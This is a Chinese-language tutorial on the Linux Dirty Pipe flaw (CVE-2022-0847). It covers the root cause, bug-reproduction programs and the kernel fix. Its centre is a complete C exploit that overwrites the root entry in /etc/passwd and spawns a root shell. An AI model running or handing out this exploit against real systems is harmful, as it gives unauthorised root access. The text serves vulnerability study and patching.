# CVE-2022-0847-DirtyPipe-Exploits

## 目錄
- 漏洞簡介
  - The Kernel Bug
  - 原機制正常運作原理
  - 如何濫用該bug

- POC(如何實作可以達成濫用的效果)
- 防禦方法
- 參考資料

# 漏洞簡介
本文介紹CVE-2022-0847，該漏洞在Linux kernel 5.8以後開始出現，它可以讓攻擊者覆寫read-only檔案。這意味著沒有root權限的process可以注入程式碼到root process。
該漏洞由Max Kellermann <max.kellermann@ionos.com>揭露，並在Linux 5.16.11、 5.15.25 與 5.10.102.被修復。
## The Kernel Bug
原作者詳細地記錄了[發現bug的過程](https://dirtypipe.cm4all.com/)。這裡不詳述。
簡單來說，這個bug的根本原因是linux kernel在某一次[commit](https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958)後，紀錄page cache是否可以被寫入的flag沒有正確的被初始化，造成受害者process的page cache可以被overwrite。
### Reproducing the bug
我的測試環境:  
>Linux Kernel 5.8.1(vulnerable)  
>Ubuntu 20.04 LTS desktop-amd64  
>virtula box 6.1

原作者Max Kellermann提供了兩隻c程式來重現這個kernel的bug。我加了sleep來避免檔案成長太快，並且把"AAAAA"改成"AAAA\n"。
#### 程式1(writer)  
```c
#include <unistd.h>
int main(int argc, char **argv) {
  for (;;) {write(1, "AAAA\n", 5);sleep(1);}
  
}
```
這隻程式會不斷的把"AAAA\n"送到stdout。  
如果我們執行
```sh
./writer >foo
```
則可以不斷的把AAAA寫到foo。
#### 程式2(splicer)
```c
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
int main(int argc, char **argv) {
  for (;;) {
    splice(0, 0, 1, 0, 2, 0);
    //ssize_t splice(int fd_in, off64_t *off_in, int fd_out,off64_t *off_out, size_t len, unsigned int flags);
    //splice 2 bytes from stdin at offset 0, to stdout at offset 0
    write(1, "BBBBB", 5);
    sleep(1);
  }
}
```
這隻程式會不斷的做:
1. 用splice()從stdin拿2個byte放進stdout
2. 把"BBBBB"放進stdout。  

如果我們執行
```sh
./splicer <foo |cat >/dev/null
```
則會把foo的內容讀取進stdin給這隻程式，然後再cat這隻程式的stdout，並丟到黑洞裡。  
#### **執行結果**
對於這兩隻c程式，我們觀察到**不同的執行順序伴隨不同的結果**。
1. 先執行第一隻程式，再同時執行第二隻c程式後，結果看起來正確。foo裡面只有A。
2. 先touch foo，再執行第二隻c程式，再同時執行第一隻c程式後，foo會看起來像這樣：
```AAAA
AAAA
BBBBBBBBBBBBBBBBBBB
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA

```
很明顯kernel存在bug，因為並沒有人去把BBBBB寫入foo，但foo卻出現了BBBBB。  
詳細的重現過程有錄成影片:https://www.youtube.com/watch?v=QcjMg_NUPIY
## 原機制預想的正常運作原理，以及哪裡出錯了
為了方便說明，以下介紹4個名詞:
### page
CPU管理記憶體的最小單位為page，通常大小是4KB。  
如果user space程式跟kernel索取記憶體，他會得到一些page(s)。File I/O也以page為單位。  

### page cache
如果你(user space的process)從file讀data，kernel會從hard-disk複製一些4KB大小的chunk到kernel memory。這些memory被稱為page cache。  
之後data才會從page cache"複製"到user space。但其實為了效率，page cache的內容不會真的被複製到user space。kernel反而會用 mmap()讓user space的process可以讀取page cache。  
### splice
另外，也是為了效率，kernel提供splice() system call。我們知道user space process使用的資料可能存在page cache，這時若該user space process想要把他的資料送到socket(也在kernel)，理論上就沒必要把資料複製到user space再複製到socket。
如果你用splice把資料從一個page cache送到另一個pipe，kernel為了效率，並不會真的去複製資料，而是傳page的reference。
```c
ssize_t splice(int fd_in, off64_t *off_in, int fd_out,off64_t *off_out, size_t len, unsigned int flags);
```
### pipe 
pipe用來實現單向process間資料傳輸。linux kernel用很多struct pipe_buffer實作pipe。每個struct pipe buffer指向一個page。當第一次寫資料進pipe會allocate一個page。**第二次寫的時候如果上一次寫的時候沒有把page用完，他就會接著寫這個page(而不是要一個新的page)**。
### 重點
但如果你是用splice從檔案撈資料放到pipe，他先(如前面提過)會把資料放進page cache。然後splice會生成一個struct pipe_buffer指向這個page cache(一樣是因為懶得複製)。而此時：
- pipe不應該有權利去寫這個page cache！
- pipe不應該有權利去寫這個page cache！
- pipe不應該有權利去寫這個page cache！

因為這個page cache是給file用的，不是pipe。
這個bug的起因就是因為在某次[commit](https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958)後，kernel不會去正確地設定pipe是否有對page cache寫入的權限！
當檔案的page cache被覆寫，你這時候再去讀檔案(讀page cache)就會讀到被覆寫的內容！
## 如何濫用該bug
既然可以靠這招覆寫檔案，我們當然可以蓋掉重要的檔案，如etc/passwd。
用以下步驟即可撰寫攻擊程式：
1. 建一個pipe。
2. 依序填滿pipe，(這會把每個page的PIPE_BUF_FLAG_CAN_MERGE 都設回true。)
3. 清空pipe(struct pipe_buffer的flag都會保留)。
4. 用splice去從你要打的file拿資料到pipe。
5. 寫資料進去pipe，你寫的資料會直接蓋進受害檔案的page cache。

- 如果這時候剛好有其他process在更新這個檔案，你蓋上去的內容就會被寫進硬碟。
- 如果這時候沒有其他process在更新這個檔案，你蓋上去的內容不會被寫進硬碟，但其他讀這個檔案的process會讀到你蓋的值，而且攻擊者不會在硬碟上留下紀錄。
# POC
此poc由[這篇](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)提供。
這隻程式會用方才提過的exploit想法把etc/passwd的root密碼蓋成piped，然後開一個有root權限的shell。
```c
/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * author: Max Kellermann <max.kellermann@ionos.com>
 *
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd ("pipe: merge
 * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
	if (pipe(p)) abort();

	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[4096];

	/* fill the pipe completely; each pipe_buffer will now have
	   the PIPE_BUF_FLAG_CAN_MERGE flag */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		write(p[1], buffer, n);
		r -= n;
	}

	/* drain the pipe, freeing all pipe_buffer instances (but
	   leaving the flags initialized) */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		read(p[0], buffer, n);
		r -= n;
	}

	/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its "flags", the buffer
	   will be mergeable */
}

int main() {
	const char *const path = "/etc/passwd";

        printf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");
        FILE *f1 = fopen("/etc/passwd", "r");
        FILE *f2 = fopen("/tmp/passwd.bak", "w");

        if (f1 == NULL) {
            printf("Failed to open /etc/passwd\n");
            exit(EXIT_FAILURE);
        } else if (f2 == NULL) {
            printf("Failed to open /tmp/passwd.bak\n");
            fclose(f1);
            exit(EXIT_FAILURE);
        }

        char c;
        while ((c = fgetc(f1)) != EOF)
            fputc(c, f2);

        fclose(f1);
        fclose(f2);

	loff_t offset = 4; // after the "root"
	const char *const data = ":$6$root$xgJsQ7yaob86QFGQQYOK0UUj.tXqKn0SLwPRqCaLs19pqYr0p1euYYLqIC6Wh2NyiiZ0Y9lXJkClRiZkeB/Q.0:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt root piped 
        printf("Setting root password to \"piped\"...\n");
	const size_t data_size = strlen(data);

	if (offset % PAGE_SIZE == 0) {
		fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
		return EXIT_FAILURE;
	}

	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
	const loff_t end_offset = offset + (loff_t)data_size;
	if (end_offset > next_page) {
		fprintf(stderr, "Sorry, cannot write across a page boundary\n");
		return EXIT_FAILURE;
	}

	/* open the input file and validate the specified offset */
	const int fd = open(path, O_RDONLY); // yes, read-only! :-)
	if (fd < 0) {
		perror("open failed");
		return EXIT_FAILURE;
	}

	struct stat st;
	if (fstat(fd, &st)) {
		perror("stat failed");
		return EXIT_FAILURE;
	}

	if (offset > st.st_size) {
		fprintf(stderr, "Offset is not inside the file\n");
		return EXIT_FAILURE;
	}

	if (end_offset > st.st_size) {
		fprintf(stderr, "Sorry, cannot enlarge the file\n");
		return EXIT_FAILURE;
	}

	/* create the pipe with all flags initialized with
	   PIPE_BUF_FLAG_CAN_MERGE */
	int p[2];
	prepare_pipe(p);

	/* splice one byte from before the specified offset into the
	   pipe; this will add a reference to the page cache, but
	   since copy_page_to_iter_pipe() does not initialize the
	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
	--offset;
	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
	if (nbytes < 0) {
		perror("splice failed");
		return EXIT_FAILURE;
	}
	if (nbytes == 0) {
		fprintf(stderr, "short splice\n");
		return EXIT_FAILURE;
	}

	/* the following write will not create a new pipe_buffer, but
	   will instead write into the page cache, because of the
	   PIPE_BUF_FLAG_CAN_MERGE flag */
	nbytes = write(p[1], data, data_size);
	if (nbytes < 0) {
		perror("write failed");
		return EXIT_FAILURE;
	}
	if ((size_t)nbytes < data_size) {
		fprintf(stderr, "short write\n");
		return EXIT_FAILURE;
	}

	char *argv[] = {"/bin/sh", "-c", "(echo piped; cat) | su - -c \""
                "echo \\\"Restoring /etc/passwd from /tmp/passwd.bak...\\\";"
                "cp /tmp/passwd.bak /etc/passwd;"
                "echo \\\"Done! Popping shell... (run commands now)\\\";"
                "/bin/sh;"
            "\" root"};
        execv("/bin/sh", argv);

        printf("system() function call seems to have failed :(\n");
	return EXIT_SUCCESS;
}
``` 
## poc執行結果
用的環境跟reproduce bug時一樣。
可以看到以一般使用者身分執行該程式，即可開啟root shell。
![](https://i.imgur.com/xhhpygz.png)
# 防禦方法
要在杜絕這個漏洞很簡單，只要在kernel的copy_page_to_iter_pipe與push_pipe各加上一行
```c
buf->flags = 0;
```
就好了。
或者升級kernel到5.16.11、 5.15.25 與 5.10.102也可以。
# 參考資料
- https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9d2231c5d74e13b2a0546fee6737ee4446017903
- https://dirtypipe.cm4all.com/
- https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
- https://docs.kernel.org/filesystems/splice.html




